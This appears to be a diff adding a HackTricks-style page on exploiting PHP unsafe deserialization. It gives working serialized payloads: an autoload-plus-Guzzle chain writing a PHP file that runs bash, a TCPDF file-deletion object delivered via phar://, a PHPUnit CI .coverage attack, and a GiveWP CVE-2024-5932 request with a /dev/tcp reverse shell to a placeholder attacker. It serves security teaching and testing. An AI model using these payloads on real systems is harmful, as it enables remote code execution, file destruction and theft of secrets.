@@ -1,0 +1,154 @@
+# PHP - Deserialization + Autoload Classes
+
+{{#include ../../banners/hacktricks-training.md}}
+
+First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).
+
+## PHP deserialization + spl_autoload_register + LFI/Gadget
+
+We are in a situation where we found a **PHP deserialization in a webapp** with **no** library vulnerable to gadgets inside **`phpggc`**. However, in the same container there was a **different composer webapp with vulnerable libraries**. Therefore, the goal was to **load the composer loader of the other webapp** and abuse it to **load a gadget that will exploit that library with a gadget** from the webapp vulnerable to deserialization.
+
+Steps:
+
+- You have found a **deserialization** and there **isn’t any gadget** in the current app code
+- You can abuse a **`spl_autoload_register`** function like the following to **load any local file with `.php` extension**
+  - For that you use a deserialization where the name of the class is going to be inside **`$name`**. You **cannot use "/" or "."** in a class name in a serialized object, but the **code** is **replacing** the **underscores** ("_") **for slashes** ("/"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load it.\
+    A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
+
+<details>
+<summary>spl_autoload_register autoload example</summary>
+
+```php
+spl_autoload_register(function ($name) {
+
+   if (preg_match('/Controller$/', $name)) {
+       $name = "controllers/${name}";
+   } elseif (preg_match('/Model$/', $name)) {
+       $name = "models/${name}";
+   } elseif (preg_match('/_/', $name)) {
+       $name = preg_replace('/_/', '/', $name);
+   }
+
+   $filename = "/${name}.php";
+
+   if (file_exists($filename)) {
+       require $filename;
+   }
+   elseif (file_exists(__DIR__ . $filename)) {
+       require __DIR__ . $filename;
+   }
+});
+```
+
+</details>
+
+> [!TIP]
+> If you have a **file upload** and can upload a file with **`.php` extension** you could **abuse this functionality directly** and get already RCE.
+
+In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.
+
+- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
+- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
+  - NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
+- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
+  - You can see **first the loader being loaded and then the payload**
+
+```php
+a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
+```
+
+- Now, we can **create and write a file**, however, the user **couldn’t write in any folder inside the web server**. So, as you can see in the payload, PHP calling **`system`** with some **base64** is created in **`/tmp/a.php`**. Then, we can **reuse the first type of payload** that we used to as LFI to load the composer loader of the other webapp t**o load the generated `/tmp/a.php`** file. Just add it to the deserialization gadget:
+
+```php
+a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
+```
+
+**Summary of the payload**
+
+- **Load the composer autoload** of a different webapp in the same container
+- **Load a phpggc gadget** to abuse a library from the other webapp (the initial webapp vulnerable to deserialization didn’t have any gadget on its libraries)
+- The gadget will **create a file with a PHP payload** on it in /tmp/a.php with malicious commands (the webapp user cannot write in any folder of any webapp)
+- The final part of our payload will use **load the generated php file** that will execute commands
+
+I needed to **call this deserialization twice**. In my testing, the first time the `/tmp/a.php` file was created but not loaded, and the second time it was correctly loaded.
+
+### Recent phpggc goodies (2025)
+
+- The **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 and others landed in 2025 — useful when the target app shares vendor code with those projects. A quick way to search is `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (update your clone first).
+- When mixing gadgets across apps via autoloading, remember **private properties in gadget definitions may be dropped** when classes are re-declared differently in the target; edit the gadget’s `chain.php` to make properties `public` if the payload arrives with empty values (same trick shown above).
+
+## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)
+
+`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserialized arbitrary PHP objects from `.coverage` files produced by the **PHPT runner**. In CI pipelines where untrusted contributors can push tests, dropping a crafted `.coverage` file triggers deserialization as soon as the suite runs — no web access needed.<sup>[[5]](#references)</sup>
+
+**Attack flow**
+
+1. Place a malicious `.coverage` file in the repo (or artifact) containing a serialized gadget that exists in the test dependencies (e.g., a Monolog or Guzzle chain from phpggc).
+2. Submit a PR; when CI executes `phpunit --configuration phpunit.xml`, the PHPT runner reads the coverage file and deserializes the gadget, giving **RCE inside the runner container**.
+3. This is especially nasty when tests mount CI secrets (cloud creds, deployment keys).
+
+**Minimal malicious coverage stub** (drop alongside a PHPT test):
+```php
+<?php
+$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
+file_put_contents('exploit.coverage', $payload);
+```
+Run the PHPT so phpunit consumes `exploit.coverage`.
+
+## TCPDF `__destruct` POP chain for arbitrary file deletion
+
+When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. If an application performs `unserialize($user_data)` while the `TCPDF` class is loaded (e.g. it expects an array with an `html` key), you can supply a serialized object that sets:
+
+- `file_id` to any integer that is not present in `self::$cleaned_ids` (e.g. `-1`).
+- `imagekeys` to paths that begin with `K_PATH_CACHE` or that can be made to look like it (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).<sup>[[1]](#references)</sup>
+
+Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
+
+```text
+a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
+```
+
+The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.<sup>[[4]](#references)</sup>
+
+### Triggering the gadget via `phar://` in html2pdf `<cert>` tags
+
+`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if the application never calls `unserialize()` itself.
+
+1. Craft a Phar with `phar.readonly=0`, set the stub/manifest to look like an image (e.g. rename `archive.phar` to `archive.png`), and store the serialized TCPDF object in the Phar metadata.<sup>[[1]](#references)</sup>
+2. Upload/place the file somewhere reachable such as `/tmp/user_files/user_1/archive.png`.
+3. Submit HTML containing the CERT tag so html2pdf resolves the attacker-controlled path:
+
+```html
+<cert src="phar:///tmp/user_files/user_1/archive.png"
+      privkey="phar:///tmp/user_files/user_1/archive.png" />
+```
+
+The call to `file_exists()` deserializes the metadata, instantiates TCPDF, and its destructor deletes the chosen file, turning html2pdf into a powerful `phar://` entry point. Version 5.3.1 added `Security::checkValidPath()` to block unapproved schemes, so legacy deployments remain attractive.
+
+### GiveWP <3.14.2 unauthenticated POP chain to RCE (CVE-2024-5932)
+
+**GiveWP** (WordPress donation plugin) up to **3.14.1** unserializes the user-controlled **`give_title`** field during `give_process_donation` without authentication. With the plugin’s dependencies autoloaded you get a **POP chain** that reaches a callable sink.<sup>[[2]](#references)</sup>
+
+- The EQSTLab PoC builds a chain using `Stripe\StripeObject` and `Give\Vendors\Faker\ValidGenerator`, sets the internal `\0*\0validator` to `shell_exec`, and tucks the attacker command in `Give\Onboarding\SettingsRepository` data.<sup>[[3]](#references)</sup>
+- POST the serialized payload as `give_title` to any donation form endpoint (e.g. `/donations/<slug>/`) with the offline gateway so no payment is attempted:
+
+```http
+POST /donations/the-things-we-need/ HTTP/1.1
+Host: giveback.htb
+Content-Type: application/x-www-form-urlencoded
+
+amount=5&give-form-id=1&give-form-title=Any&give-gateway=offline&action=give_process_donation&give_title=O:31:"Stripe\StripeObject":1:{...serialized payload...}
+```
+
+- Output is **blind**, so use a **callback payload** such as a Bash reverse shell: `bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"` and listen with `nc -lnvp PORT`.
+- The same chain can delete arbitrary files by pointing the sink at `unlink`. Use **phpggc** or the PoC (Python + `uv run CVE-2024-5932-rce.py -u <form_url> -c '<cmd>'`) to craft the blob, but any serializer able to emit PHP objects works.<sup>[[3]](#references)</sup>
+
+## References
+
+- [1] [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
+- [2] [HTB Giveback – CVE-2024-5932 GiveWP unauthenticated deserialization → RCE](https://0xdf.gitlab.io/2026/02/21/htb-giveback.html)
+- [3] [EQSTLab PoC – CVE-2024-5932 GiveWP RCE](https://github.com/EQSTLab/CVE-2024-5932)
+- [4] [GitLab Advisory Database – tecnickcom/tcpdf vulnerabilities (hash comparison, phar deserialization)](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
+- [5] [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)
+
+{{#include ../../banners/hacktricks-training.md}}
